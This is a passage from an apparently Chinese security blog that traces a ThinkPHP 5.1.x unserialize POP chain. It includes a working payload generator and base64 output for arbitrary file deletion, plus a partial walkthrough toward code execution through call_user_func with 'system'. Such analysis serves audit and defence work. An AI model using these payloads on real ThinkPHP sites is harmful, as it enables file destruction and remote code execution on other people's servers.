class="string">"127.0.0.1"</span></span><br><span class="line">xdebug.remote_port = <span class="number">9000</span></span><br></pre></td></tr></table></figure><p><strong>4、重启Apache服务器</strong></p><p>查看phpinfo开启成功<br><img src="https://img-blog.csdnimg.cn/20191220141539211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 反序列化深入分析pop利用链</title>
      <link href="/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2019/12/18/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90pop%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC](Thinkphp 反序列化深入分析)</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>Thinkphp 5.1.37</strong>  —–    应该是5.1.x可以</p><p>php 7.0.12  </p><p>composer create-project topthink/think=5.1.37 v5.1.37</p><h1 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h1><p> <strong>1. PHP反序列化原理</strong><br>PHP反序列化就是在读取一段字符串然后将字符串反序列化成php对象。<br> <strong>2. 在PHP反序列化的过程中会自动执行一些魔术方法</strong></p><p>方法名    —————调用条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__call调用不可访问或不存在的方法时被调用</span><br><span class="line">__callStatic调用不可访问或不存在的静态方法时被调用</span><br><span class="line">__clone进行对象clone时被调用，用来调整对象的克隆行为</span><br><span class="line">__constuct构建对象的时被调用；</span><br><span class="line">__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</span><br><span class="line">__destruct明确销毁对象或脚本结束时被调用；</span><br><span class="line">__get读取不可访问或不存在属性时被调用</span><br><span class="line">__invoke当以函数方式调用对象时被调用</span><br><span class="line">__isset对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line">__set当给不可访问或不存在属性赋值时被调用</span><br><span class="line">__set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</span><br><span class="line">__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line">__toString当一个类被转换成字符串时被调用</span><br><span class="line">__unset对不可访问或不存在的属性进行unset时被调用</span><br><span class="line">__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作</span><br></pre></td></tr></table></figure><p> <strong>3. 反序列化的常见起点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 一定会调用</span><br><span class="line"></span><br><span class="line">__destruct 一定会调用</span><br><span class="line"></span><br><span class="line">__toString 当一个对象被反序列化后又被当做字符串使用</span><br></pre></td></tr></table></figure><p><strong>4.反序列化的常见中间跳板:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__toString 当一个对象被当做字符串使用</span><br><span class="line"></span><br><span class="line">__get 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__set 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line"></span><br><span class="line">形如 $this-&gt;$func();</span><br></pre></td></tr></table></figure><p><strong>5.反序列化的常见终点:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__call 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">call_user_func 一般php代码执行都会选择这里</span><br><span class="line"></span><br><span class="line">call_user_func_array 一般php代码执行都会选择这里</span><br></pre></td></tr></table></figure><p><strong>6.Phar反序列化原理以及特征</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;伪协议会在多个函数中反序列化其metadata部分</span><br><span class="line"></span><br><span class="line">受影响的函数包括不限于如下:</span><br><span class="line"></span><br><span class="line">copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,</span><br><span class="line">fileinode,filemtime,fileowner,fileperms,</span><br><span class="line">fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,</span><br><span class="line">is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,</span><br><span class="line">imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,</span><br><span class="line">get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo</span><br></pre></td></tr></table></figure><h1 id="漏洞起点"><a href="#漏洞起点" class="headerlink" title="漏洞起点"></a>漏洞起点</h1><p>漏洞起点在\thinkphp\library\think\process\pipes\windows.php的__destruct魔法函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__destruct()里面调用了两个函数，我们跟进removeFiles()函数。</p><p><img src="https://img-blog.csdnimg.cn/20200106153640755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>这里看到 unlink函数<br>这里同时也存在一个任意文件删除的漏洞，Payload构造： 必须使用namespace设置命名空间！</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="string">'D:\\phpStudy\\PHPTutorial\\WWW\\tp5\\install.lock'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjQ0OiJEOlxwaHBTdHVkeVxQSFBUdXRvcmlhbFxXV1dcdHA1XGluc3RhbGwubG9jayI7fX0&#x3D;</span><br></pre></td></tr></table></figure><p>这里只需要一个反序列化漏洞的触发点，便可以实现任意文件删除。<br>自行构造一个利用点，试用一下<br>复现成功</p><p><img src="https://img-blog.csdnimg.cn/20200106154101612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="rce部分起点"><a href="#rce部分起点" class="headerlink" title="rce部分起点"></a>rce部分起点</h2><p><strong>在removeFiles()中使用了file_exists对 filename进行了处理。$filename会被作为字符串处理。<br><img src="https://img-blog.csdnimg.cn/20200106154555433.png" alt="在这里插入图片描述"><br>而<strong>toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发</strong>toString 方法。我们全局搜索__toString方法。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200106154654367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>这里我们选择  \thinkphp\library\think\model\concern\Conversion.php<br>Conversion类的第224行, 这里调用了一个toJson()方法。</strong></p><p>\thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>跟进toJson()方法</p><p>\thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>继续toArray()方法</p><p>thinkphp\library\think\model\concern\Conversion.php<br><img src="https://img-blog.csdnimg.cn/2020010615552628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>目的</li></ul><p><strong>我们需要在toArray()函数中寻找一个满足<code>$可控变量-&gt;方法(参数可控)</code>的点</strong></p><ul><li>首先，这里调用了一个getRelation方法。</li><li>我们跟进getRelation()，<strong>它位于Attribute类中</strong></li></ul><p>thinkphp\library\think\model\concern\Conversion.php<br><img src="https://img-blog.csdnimg.cn/202001061559427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里调用了getRelation方法，跟入后得到代码：</p><p>thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于getRelation()下面的if语句为if (!$relation)，所以这里不用理会，返回空即可。</p><p><img src="https://img-blog.csdnimg.cn/20200106165650553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后调用了getAttr方法，我们跟进getAttr方法</p><p>thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">....</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure><p>继续跟进getData方法</p><p>thinkphp\library\think\model\concern\Attribute.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过查看getData函数我们可以知道$relation的值为$this-&gt;data[$name]，需要注意的一点是这里类的定义使用的是Trait而不是class。自<br>PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use<br>关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。</p></blockquote><p>我们可以在\thinkphp\library\think\Model.php中找到这样一个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br></pre></td></tr></table></figure><p><strong>我们梳理一下目前我们需要控制的变量</strong></p><ul><li>$files位于类Windows</li><li>$append位于类Conversion</li><li>$data位于类Attribute</li></ul><p>引用大佬的图，简单的看一下，后面还有梳理<br><img src="https://img-blog.csdnimg.cn/20200106171421443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="代码执行点分析"><a href="#代码执行点分析" class="headerlink" title="代码执行点分析"></a>代码执行点分析</h2><p>这里的<code>$this-&gt;append</code>是我们<strong>可控</strong>的（在conversion中），然后通过<code>getRelation($key)</code>，但是下面有一个<code>!$relation</code>,所以我们只要置空即可</p><p>然后调用<code>getAttr($key)</code>,在调用<code>getData($name)</code>函数，这里<code>$this-&gt;data[&#39;name&#39;]</code>我们<strong>可控</strong>（在attribute中）</p><p> <code>$relation</code> 变量来自 <code>$this-&gt;data[$name]</code><br> <code>$name</code> 变量来自 <code>$this-&gt;append</code></p><p>之后回到toArray函数，通过这一句话<code>$relation-&gt;visible($name);</code> 我们控制<code>$relation</code>为一个类对象，调用不存在的visible方法，会自动调用<code>__call</code>方法，那么我们找到一个类对象没有visible方法</p><p>我们现在缺少一个进行代码执行的点，在这个类中需要没有visible方法。并且最好存在__call方法。</p><p>因为<strong>call一般会存在</strong>call_user_func和__call_user_func_array，php代码执行的终点经常选择这里。我们不止一次在Thinkphp的rce中见到这两个方法。</p><p><strong>可以在/thinkphp/library/think/Request.php，找到一个<strong>call函数。</strong>call 调用不可访问或不存在的方法时被调用。</strong></p><p>下面是引用大佬的图，很清晰的链条</p><p><img src="https://img-blog.csdnimg.cn/20200106171533384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>call_user_func_array(‘system’,array(‘whoami’));<br>call_user_func(‘system’,’calc’);</p></blockquote><p>找到<br>/thinkphp/library/think/Request.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">           array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">           <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">   &#125;</span><br><span class="line">  .....</span><br></pre></td></tr></table></figure><p> <code>$hook</code>这里是可控的，所以<code>call_user_func_array(array(任意类,任意方法),$args)</code> ，这样我们就可以调用任意类的任意方法了。，但是<code>array_unshift()</code>向数组插入新元素时会将新数组的值将被插入到数组的开头，<code>$args</code>第一个值不能够控制。这种情况下我们是构造不出可用的payload的。由于$args第一个值不能够控制，但是构造不出来参数可用的payload，因为第一个参数是$this对象</p><p> <strong><code>call_user_func_array(array(任意类,任意方法),$args)</code> ，这样我们就可以调用任意类的任意方法了。</strong><br>虽然第330行用 array_unshift 函数把本类对象 $this 放在数组变量 $args 的第一个，但是我们可以寻找不受这个参数影响的方法</p><p> ThinkPHP 历史 RCE 漏洞的人可能知道， think\Request 类的 input 方法经常是，相当于 <code>call_user_func($filter,$data)</code> 。但是前面， <code>$args</code> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。</p><p> <strong>最终产生rce的地方是在input函数当中</strong></p><p>在input函数中有一个 <code>$this-&gt;filterValue($data, $name, $filter);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br></pre></td></tr></table></figure><p>但是这里的$value不能自己进行控制，所以需要往上找可以控制value的地方,共发现以下函数:</p><ol><li>cookie</li><li>input 但是这里的input参数并不是可控的:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">       <span class="comment">// 获取原始数据</span></span><br><span class="line">       <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">       <span class="comment">// 解析name</span></span><br><span class="line">       <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">         <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> $default;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> $data;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">       array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">       <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这里<code>$filter</code>可控，data参数不可控，而且<code>$name = (string) $name;</code>这里如果直接调用input的话，执行到这一句的时候会报错，直接退出，所以继续回溯，目的是要找到可以控制$name变量，使之最好是字符串。同时也要找到能控制data参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">       $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">       <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">         $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">         $data = $data[$val];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续找一个调用input函数的地方。我们找到了param函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 